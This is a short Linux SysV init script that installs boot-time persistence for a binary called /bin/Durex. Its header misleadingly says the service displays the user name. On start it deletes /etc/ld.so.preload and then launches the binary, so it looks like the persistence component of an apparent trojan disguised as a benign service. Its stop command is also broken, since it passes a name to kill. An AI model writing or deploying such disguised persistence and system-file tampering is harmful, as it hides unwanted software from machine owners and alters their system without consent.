#! /bin/sh
### BEGIN INIT INFO
# Provides:          durex
# Required-Start:    
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      2 3 4 5
# Short-Description: Display actual user name
### END INIT INFO

PATH=/bin:/usr/bin:/sbin:/usr/sbin

test -x /bin/Durex || exit 0

#.

case "$1" in
    start)
        if test -f /etc/ld.so.preload; then
            unlink /etc/ld.so.preload
        fi
        rm -f /etc/ld.so.preload
        Durex
        ;;
    stop)
        kill -15 Durex
        ;;
    *)
        echo "Usage: /etc/init.d/$NAME {start|stop}" >&2
        exit 2
        ;;
esac

exit 0
